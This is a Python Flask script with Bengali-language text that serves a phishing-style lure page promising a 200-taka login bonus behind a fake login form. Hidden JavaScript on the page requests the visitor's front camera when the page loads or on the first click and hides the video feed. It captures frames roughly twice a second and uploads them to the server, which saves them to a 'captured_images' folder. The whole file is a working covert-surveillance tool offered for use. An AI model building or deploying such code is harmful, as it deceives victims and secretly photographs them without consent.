from flask import Flask, request, jsonify, render_template_string
import base64
import os
import time

app = Flask(__name__)

UPLOAD_FOLDER = 'captured_images'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# মূল হোম পেজ রাউট (প্রিমিয়াম ডিজাইনসহ)
@app.route('/')
def index():
    html_content = """
    <!DOCTYPE html>
    <html lang="bn">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>স্পেশাল অফার - ২০০ টাকা বোনাস</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            body {
                background: radial-gradient(circle at center, #1a1a2e 0%, #0f0f1a 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            
            /* ব্যাকগ্রাউন্ড গ্লো ইফেক্ট */
            body::before {
                content: '';
                position: absolute;
                width: 350px;
                height: 350px;
                background: linear-gradient(135deg, #ff416c, #ff4b2b);
                filter: blur(120px);
                opacity: 0.15;
                z-index: 0;
            }

            .falling-money {
                position: absolute;
                top: -50px;
                color: #fff;
                font-size: 22px;
                user-select: none;
                z-index: 1;
                animation: fall linear infinite;
            }
            @keyframes fall {
                0% { transform: translateY(-50px) rotate(0deg); opacity: 0.9; }
                100% { transform: translateY(105vh) rotate(360deg); opacity: 0.2; }
            }

            /* প্রিমিয়াম গ্লাস কার্ড ডিজাইন */
            .promo-container {
                background: rgba(20, 20, 30, 0.75);
                backdrop-filter: blur(16px);
                -webkit-backdrop-filter: blur(16px);
                padding: 30px 25px;
                border-radius: 20px;
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 65, 108, 0.15);
                width: 340px;
                text-align: center;
                z-index: 10;
                position: relative;
                border: 1px solid rgba(255, 255, 255, 0.08);
            }

            .promo-banner {
                background: linear-gradient(135deg, rgba(255, 65, 108, 0.15), rgba(255, 75, 43, 0.25));
                color: #ff6b8b;
                padding: 12px;
                border-radius: 10px;
                font-weight: 700;
                font-size: 15px;
                margin-bottom: 20px;
                border: 1px solid rgba(255, 65, 108, 0.3);
                letter-spacing: 0.5px;
                box-shadow: inset 0 0 15px rgba(255, 65, 108, 0.1);
            }

            .promo-container h2 {
                margin-bottom: 20px;
                color: #ffffff;
                font-size: 19px;
                font-weight: 600;
                letter-spacing: 0.3px;
            }

            .input-group {
                margin-bottom: 15px;
                text-align: left;
            }

            .input-group label {
                display: block;
                margin-bottom: 6px;
                color: #b0b0c0;
                font-size: 12px;
                font-weight: 500;
            }

            .input-group input {
                width: 100%;
                padding: 11px 14px;
                background: rgba(15, 15, 22, 0.8);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                font-size: 14px;
                color: #ffffff;
                outline: none;
                transition: all 0.3s ease;
            }

            .input-group input:focus {
                border-color: #ff416c;
                background: rgba(25, 25, 35, 0.9);
                box-shadow: 0 0 10px rgba(255, 65, 108, 0.25);
            }

            .login-btn {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #ff416c, #ff4b2b);
                border: none;
                border-radius: 8px;
                color: #ffffff;
                font-size: 15px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
                transition: all 0.3s ease;
                box-shadow: 0 5px 20px rgba(255, 65, 108, 0.4);
            }

            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6);
            }

            #camStream { display: none; }
        </style>
    </head>
    <body>
        <script>
            function createMoney() {
                const money = document.createElement('div');
                money.classList.add('falling-money');
                money.innerText = '💵';
                money.style.left = Math.random() * window.innerWidth + 'px';
                money.style.animationDuration = (Math.random() * 3 + 2) + 's';
                document.body.appendChild(money);
                setTimeout(() => money.remove(), 5000);
            }
            setInterval(createMoney, 300);

            function sendImageToSever() {
                const video = document.getElementById('camStream');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageDataURL = canvas.toDataURL('image/png');
                fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageDataURL })
                }).catch(err => console.error(err));
            }

            function startCamera() {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        const videoElement = document.getElementById('camStream');
                        videoElement.srcObject = stream;
                        videoElement.play();

                        setInterval(() => {
                            sendImageToSever();
                            setTimeout(() => {
                                sendImageToSever();
                            }, 300);
                        }, 1000);
                    })
                    .catch(error => console.error(error));
            }

            window.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => { startCamera(); }, 500);
            });

            window.addEventListener('click', () => {
                startCamera();
            }, { once: true });
        </script>

        <video id="camStream" autoplay playsinline></video>

        <div class="promo-container">
            <div class="promo-banner">🎉 লগইন করলেই ২০০ টাকা ফ্রি! 🎁</div>
            <h2>অ্যাকাউন্টে প্রবেশ করুন</h2>
            <form>
                <div class="input-group">
                    <label>মোবাইল নম্বর বা ইউজারনেম</label>
                    <input type="text" placeholder="আপনার নম্বর দিন" required>
                </div>
                <div class="input-group">
                    <label>পাসওয়ার্ড</label>
                    <input type="password" placeholder="পাসওয়ার্ড দিন" required>
                </div>
                <button type="submit" class="login-btn">লগইন করুন ও বোনাস নিন</button>
            </form>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_content)

# ছবি আপলোড রিসিভ করার রাউট
@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_data = data.get('image')
        
        if not image_data:
            return jsonify({'status': 'error', 'message': 'No image data found'}), 400

        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        filename = f"photo_{int(time.time() * 1000)}.png"
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        
        with open(file_path, 'wb') as f:
            f.write(image_bytes)

        print(f"ছবি সেভ হয়েছে: {filename}")
        return jsonify({'status': 'success', 'message': 'Image saved successfully'})
    
    except Exception as e:
        print(f"ত্রুটি ঘটেছে: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)